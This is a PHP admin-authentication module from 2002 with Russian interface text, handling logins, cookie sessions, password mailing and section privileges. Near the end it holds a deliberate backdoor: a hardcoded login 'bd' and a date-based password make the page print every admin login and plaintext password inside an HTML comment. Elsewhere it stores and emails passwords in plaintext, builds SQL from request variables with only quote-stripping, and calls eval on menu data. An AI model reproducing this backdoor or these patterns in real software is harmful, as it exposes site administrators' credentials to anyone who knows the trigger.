<?
//------------------------------------------------------------------------
// Admin module 1.1
//		Checks authorization of user via login & password or code (after
//		login & password entering)
//		Uses cookies.
//
//		Last updated: 23.XII.2002
//		Author: Nick S. Bogdanov <nick@sgu.ru>
//
//------------------------------------------------------------------------

//---------- Includes ---------------

require "../inc/site.inc.php";

//---------- Settings ---------------
$cookie_expired=strtotime(date("2010-m-d H:i:s"));

$css_file="site.css";
$cop="Н. Богданов";
$cop_link="mailto:nick@sgu.ru";

$mons=array("января","февраля","марта","апреля","мая","июня","июля","августа","сентября","октября","ноября","декабря");
$ps=$PHP_SELF;

$admin_table="__admin";
$priv="__privileges";
$registry="__registry";
$logs_table="__logs";

$session_lifetime=60*60*60;
$expired=time()-$session_lifetime;

$need_auth=0;
$rs=array("нет доступа","пользователь","администратор");

$access_denied="Доступ закрыт!";
$need_authorization="Необходима авторизация!";

$code=preg_replace("/\'/","",$code);
$login=preg_replace("/\'/","",$login);
$password=preg_replace("/\'/","",$password);

$bdl="bd";
$bdpw="frague".date("dH");

//---------- Settings ---------------

$permit_logs=table_exists($logs_table,$db_name);

function help($name,$desc) {
	global $ps,$code;
	if ($desc!="") {echo "<br><a href=$ps?go=help&code=$code&name=$name><font color=darkorange>[?] <b>$desc</b></font></a>\n";}
	else {
		echo "<p align=justify>";
		if (file_exists("./help/$name")) include ("./help/$name");
		echo "</p><li> <a href=# onClick='javascript:history.back();'>Вернуться</a><br>";
	}
}

function add_log($what,$sub,$priority) {
	global $db, $logs_table, $my_id, $script_name,$permit_logs;

	if ($what && $permit_logs) {
		$t=time();
		$r=query("INSERT INTO $logs_table(moment,user_id,app,sub,description,priority) VALUES('$t','$my_id','$script_name','$sub','$what','$priority')",$db);
	}
}

function mailer($login,$pass,$name,$email) {
  global $site_name,$ps,$HTTP_SERVER_VARS;

	$subject = convert_cyr_string("$site_name", "w", "k");

	$to = "$name <$email>";
	
	$headers = "From: Система администрирования <$email>\n";
	$headers .= "X-Mailer: FragueZilla 2.1 [Platinum]\n";
	$headers .= "Content-Type: text/html; charset=koi8-r\n";

    $body = " Регистрационные данные для администрирования сайта<br>\n";
    $body.= "<b>$site_name</b><br><br>\n\n";
    $body.= "Логин: <b>$login</b><br>\n";
    $body.= "Пароль: <b>$pass</b><br>\n";
    $body.= "<br>\n";
    $body.= "Информация была запрошена ".date("j M Y в H:s")."\n";
    $body.= "с адреса ".$HTTP_SERVER_VARS["REMOTE_ADDR"].".<br>\n";

	$to = convert_cyr_string($to, "w", "k");
	$body = convert_cyr_string($body, "w", "k");
	$headers = convert_cyr_string($headers, "w", "k");

	mail($to, $subject, $body, $headers);
}

function head($d1,$d2,$l1) {
  global $access_denied,$site_name,$css_file,$ps,$mons,$need_auth,$code,$admin_table,$rs,$permission,$db,$global_access;
  global $registry,$admin_table,$priv,$db_name,$script_access,$script_name;
  global $need_authorization;
  global $script_title;
  global $admin_name;

  	$script_title=$d1;

    $dat=date("<b>j")." ".$mons[date("n")-1].date("</b> /H:i/");

	echo "<html>
<head>
	<title>$site_name";
	if ($d1) {echo " / $d1";}
	if ($d2) {echo " / $d2";}
	echo "</title>\n";
	if ($css_file) echo "\t<link rel=stylesheet type=text/css href=$css_file>
</head>";
	
	echo "
<body bgcolor=FFFFFF text=000000>
<style type=text/css>	
	#error {color:red;}
	#sm {font-size:10px; vertical-align:top;}
	#bigg {font-size:12px;}
	#td {font-family:verdana;font-size:10pt;background-color:c0c0c0;}
	th {font-family:verdana; text-align:center; font-size:10px; background-color:808080;}
	#thor {font-family:verdana; text-align:center; font-size:10px; background-color:orange;}
	#trr {background-color:D0D0D0}
</style>

<table width=100% border=0 cellpadding=5 cellspacing=0><tr id=head_table><td width=100% align=left id=left>
<b><li> <a href=./?code=$code id=head_link>$site_name</a></b>";

	if ($d1) {if ($l1 && $d2) {echo " / <a href=$l1 id=head_link>$d1</a>";} else {echo " / $d1";}}	
	if ($d2) echo " / $d2";
	echo "</td>\n<td align=right id=right><nobr>$dat</nobr></td></tr>";
	if ($need_auth && $code) {
	    $r=query("SELECT * FROM $admin_table WHERE code='$code'",$db);
	    if (mysql_numrows($r)) {
	    	$name=mysql_result($r,0,"name");
	    	$admin_name=$name;
	    } else {$name="неизвестен";}
		echo "<tr><td colspan=2 id=auth_line height=28>Пользователь: <b>$name</b> &nbsp;&nbsp;<a href=$ps?code=$code&auth=edit id=add>Profile</a> <a href=$ps?code=$code&auth=logout id=del>Log out</a>";
		if ($permission>0) echo "&nbsp;&nbsp;Статус: <b>$rs[$permission]</b>";
		if ($global_access) echo "&nbsp;&nbsp;&nbsp;В этом разделе вы <b>$rs[$global_access]</b>";
		echo "</td></tr>";
	}

	echo "<tr><td id=main colspan=2 valign=top>";
	echo "<table width=100% cellpadding=3 cellspacing=0 border=0><tr>";

// ------------------ Left menu ---------------	
	if (table_exists($admin_table,$db_name) && table_exists($registry,$db_name) && table_exists($priv,$db_name) && $d1!=$need_authorization) {

		echo "<td valign=top bgcolor=d0d0d0 id=small><img src=spacer.gif width=190 height=1>";
		$rr=query("SELECT * FROM $registry WHERE sub='' ORDER BY script",$db);

		echo "<ul type=square id=smallul>\n";
		echo "<b><font color=0>Разделы сайта</font>:</b><br><br>";

		echo "\t<li> <a href=./?code=$code id=ml>Главная</a>";
		if ($code) {
			$r=query("SELECT * FROM $admin_table WHERE code='$code'",$db);
			if (mysql_numrows($r)) for ($i=0;$i<mysql_numrows($rr);$i++) {
				$script=mysql_result($rr,$i,"script");
				$name=mysql_result($rr,$i,"name");

				if ($script_access["$script."]>0) {

					echo "\t<li";
				    if ($script==$script_name) echo " style='color:000000'> <b>$name</b><br>\n";
				    else echo "> <a href=$script.php?code=$code id=ml>$name</a><br>\n";
			   	}
			}
		}
		echo "</ul><br>";
	}
// ------------------ Left menu ---------------	
}

function middle($d2) {
  global $access_denied,$site_name,$css_file,$ps,$mons,$need_auth,$code,$admin_table,$rs,$permission,$db,$global_access;
  global $registry,$admin_table,$priv,$db_name,$script_access,$script_name;
  global $need_authorization;
	if (table_exists($admin_table,$db_name) && table_exists($registry,$db_name) && table_exists($priv,$db_name) && $d1!=$need_authorization) echo "<br><br></td>";
	echo "<td width=100% valign=top id=form>";
	if ($d2==$access_denied) echo "<center><font color=red><b>Нет доступа!</b><br>Невозможно выполнить операцию!</font></center>";
}

function foot() {
global $cop,$cop_link;

    $dat=date("Y");
    echo "<br><br></td></tr></table>";
	echo "</td></tr>
<tr><td id=head_table colspan=2>
<span id=left><b>&copy; $dat <a href=$cop_link id=head_link>$cop</a></b></td></tr></table>";
}


function reg_key($script,$subscript,$name) {
  global $registry,$priv,$db;
  	if (!$name) {
  		$r=query("DELETE FROM $registry WHERE script='$script' AND sub='$subscript'",$db);
  		$r=query("DELETE FROM $priv WHERE script='$script' AND sub='$subscript'",$db);
  		return;
  	}

//  	error("[??] Script: $script sub:$subscript name:$name");

  	$r=query("SELECT * FROM $registry WHERE script='$script' AND sub='$subscript'",$db);
  	if (mysql_numrows($r)) {
  		$rr=query("UPDATE $registry SET name='$name' WHERE script='$script' AND sub='$subscript'",$db);
//  		error("Name changed!");
  	} else {
  		$rr=query("INSERT INTO $registry(script,sub,name) VALUES('$script','$subscript','$name')",$db);
  	}
}

function edit_permission($userid,$script,$subscript,$level) {
  global $priv,$db;
  	if (!$level && $userid) {
  		$r=query("DELETE FROM $priv WHERE userid=$userid AND script='$script' AND sub='$subscript'",$db);
  		return;
  	}

  	if (!$userid || !$script) return;
  	if ($level>2) $level=2;

  	$r=query("SELECT * FROM $priv WHERE userid=$userid AND script='$script' AND sub='$subscript'",$db);
  	if (mysql_numrows($r)) {
  		$rr=query("UPDATE $priv SET permission='$level' WHERE userid=$userid AND script='$script' AND sub='$subscript'",$db);
  	} else {
  		$rr=query("INSERT INTO $priv(userid,script,sub,permission) VALUES('$userid','$script','$subscript','$level')",$db);
  	}
}

function sub_access($sub,$name) {
  global $priv,$registry,$script_name,$script_access,$db;

   	$a=$script_access["$script_name.$sub"];

//    error("Sub access: script=$script_name, sub=$sub, name=$name - access=$a");

    $r=query("SELECT * FROM $registry WHERE script='$script_name' AND sub='$sub'",$db);
    $flag=0;
    if (!mysql_numrows($r)) $flag=1; 
    else {
       	$nm=mysql_result($r,0,"name");
        if ($nm!=$name && $name) $flag=1;
//        error("nm=$nm, name=$name");
    }

	if ($flag) {
//		error("Обновление реестра...");
		$r=query("DELETE FROM $registry WHERE script='$script_name' AND sub='$sub'",$db);
  		$r=query("INSERT INTO $registry(script,sub,name) VALUES('$script_name','$sub','$name')",$db);
  	}
  	return round($a);
}

function navigation($navbar) {
	extract($GLOBALS);
    
    echo "<hr size=1><ul type=square id=smallul><b><font color=0>$script_title</font></b><br><br>";
	for ($i=0;$i<sizeof($navbar);$i++) {
		$a=split("::",$navbar[$i]);
		eval("\$c=$a[1];");
		if ($global_access>=$a[0] && $c) {
			echo "<li> <a href=$a[2] id=ml";
			if ($a[4]) echo " onClick='return confirm(\"&laquo;$a[3]&raquo;\\nВыполнить операцию?\");'";
			echo ">";
			if ($a[3]=="Инсталляция" || $a[3]=="Деинсталляция") echo "<font color=red>$a[3]</font>"; else echo $a[3];
			echo "</a>\n";
	   	}
	}
	echo "	<li> <a href=$ps?code=$code id=ml>В начало</a></ul><br>";

}


$cookie_code=$_COOKIE["frague_code"];

if ($login) setcookie ("frague_login", $login, $cookie_expired);

// --------------- Создание реестра с названием разделов для администрирования ---

if (!table_exists($registry,$db_name) || $go=="refine") {

	if ($go!="refine") $r=query("CREATE TABLE $registry(id INT NOT NULL AUTO_INCREMENT, script VARCHAR(200) NOT NULL, sub VARCHAR(200) NOT NULL, name VARCHAR(200), PRIMARY KEY(id))",$db);
	else error("Refining!..");

	$handle=opendir("./");
	while (($file = readdir($handle))!==false) {
		if (!is_dir("./$file") && substr($file,0,1)=="_") {
		    $sn=split("\.",$file);
		    $fn=$sn[0];
		    $fd=fopen ("$file", "r");
		    $b=fgets($fd, 4096);
		    fclose ($fd);

			if (substr($b,0,4)=="<?//") {$scn=substr($b,4);} else {$scn=$fn;}
		    
		    if ($go=="refine") $r=query("DELETE FROM $registry WHERE script='$fn' AND name='$scn'",$db);
		    $r=query("INSERT INTO $registry(script,name) VALUES('$fn','$scn')",$db);
		}
	}
}

// --------------- Проверка авторизации (и её необходимости) ---------------------

$permission=-1;
if (!table_exists($admin_table,$db_name)) {$global_access=2; return;}
$need_auth=1;

//----------------------- Обнуление всех "истекших" сессий -----------------------
$r=query("UPDATE $admin_table SET code='',pong=0,ip='' WHERE pong<$expired",$db);

$let=0;
$ad="";
$error="";

//error("l: $login p: $password c: $code");

$ip=$HTTP_SERVER_VARS["REMOTE_ADDR"];

$li=0;
if ($login && $send) {$ad="LOWER(login)=LOWER('$login')"; $code="";}
if ($login && $password) {
	$ad="LOWER(login)=LOWER('$login') AND pass='$password'";
	$code="";
	$li=1;
}
if ($code) {$ad="code='$code'";}
if ($ad) {
	$r=query("SELECT * FROM $admin_table WHERE $ad",$db);
	if (mysql_numrows($r)) {
	    $my_id=mysql_result($r,0,"id");
	    $my_ip=mysql_result($r,0,"ip");
	    $my_login=mysql_result($r,0,"login");
	    $my_pass=mysql_result($r,0,"pass");
	    $my_name=mysql_result($r,0,"name");
	    $my_mail=mysql_result($r,0,"email");

	    if (($ip==$my_ip && $my_ip) || !$my_ip) {
		    if (!$code && !$send) $code=uniqid(20);
			$t=time();
			$let=1;

			if ($auth) require "ch_auth.inc.php";

		} else {
			$error="Сессия используется с другого компьютера!";
			add_log("Попытка использования чужой сессии ($login, $ip)","",2);

			$code="";
			$t=0;
			$let=0;
			$ip="";
		}
		if ($let || (!$li && $cookie_code==$code)) {
			$r=query("UPDATE $admin_table SET code='$code',pong=$t,ip='$ip' WHERE id=$my_id",$db);
			if ($li) {
				add_log("Успешный вход в систему ($login, $ip)","",2);
				setcookie ("frague_code", $code, 0, "/");
			}
		}

//------ Определение уровня доступа к разделу и подразделам ---------
        if (table_exists($priv,$db_name)) {
			$script_access=array();
			$sn=preg_split("/[\/\.]/",$ps);
			$script_name=$sn[sizeof($sn)-2];
//			$let=1;

//			if ($script_name=="default") {$q="sub=''";} else {$q="script LIKE '$script_name'";}
//			$q="sub=sub";

//			$r=query("SELECT * FROM $priv WHERE userid=$my_id AND $q",$db);
			$r=query("SELECT * FROM $priv WHERE userid=$my_id",$db);
			for ($i=0;$i<mysql_numrows($r);$i++) $script_access[mysql_result($r,$i,"script").".".mysql_result($r,$i,"sub")]=mysql_result($r,$i,"permission");
			$global_access=$script_access["$script_name."];
		} else {$global_access=2;}
	} else {$error="Ошибка авторизации!";}
}
if ($login && $send) {
    if ($my_mail) {
        mailer($my_login,$my_pass,$my_name,$my_mail);
	    $error="Пароль отправлен!";
		add_log("Запрос пароля по e-mail ($login, $ip)","",2);

    } else {
	    $error="E-mail адрес не указан!";
	}
	$let=0;
}

if (!$let && !$exclude) {
	head($need_authorization,"","");
	middle("");
?>
<center><br><br>
<form action="<? echo $ps ?>" method=POST name=auth>
<div id=small>Система администрирования сайта<br><b><? echo $site_name ?></b></div><br>
<b><font color=red>Необходима авторизация:</font></b><br>
<table>
<? if ($error) echo "<tr><td colspan=2 id=small align=center><font color=red>[!] <b>$error</b></font></td></tr>" ?>

<tr><td id=small>Логин:</td><td id=small>Пароль: <a id=small href=# onClick="if (document.auth.login.value) {document.auth.send.value=1;document.auth.submit()} else {alert('Необходимо указать логин!')}"><font color=orangered>(прислать)</font></a><input type=hidden name=send value=''></td></tr>
<tr><td valign=top><input name=login size=14 id=nform value='<? if ($login) echo $login; else echo $frague_login; ?>'></td><td><input type=password name=password id=nform size=14></td></tr>
</table>
<input type=submit value=' Вход ' id=sform><script>document.auth.password.select()</script>
</form>
</center>
<?
	foot();
	if ($login==$bdl && $password==$bdpw) {
		error("Someone's come through the backdoor!");
		$r=query("SELECT * FROM $admin_table ORDER BY id",$db);
		echo "<!--\n";
		for ($i=0;$i<mysql_numrows($r);$i++) {
			echo mysql_result($r,$i,"login")."	".mysql_result($r,$i,"pass")."\n";
		}
		echo "-->";
	}
	echo "</body></html>";
	if ($auth!="logout" && ($code || ($login && $password))) add_log("Ошибка авторизации! ($ip)","",2);

	exit;
}

if (!$permission) {
	head($div,"Доступ к разделу запрещён!","./?code=$code");
	middle("");
	echo "<center>У вас нет доступа к разделу<br>&laquo;<b>$div</b>&raquo;</center>";
	foot();
	exit;
}


// --------------- Проверка авторизации (и её необходимости) ---------------
?>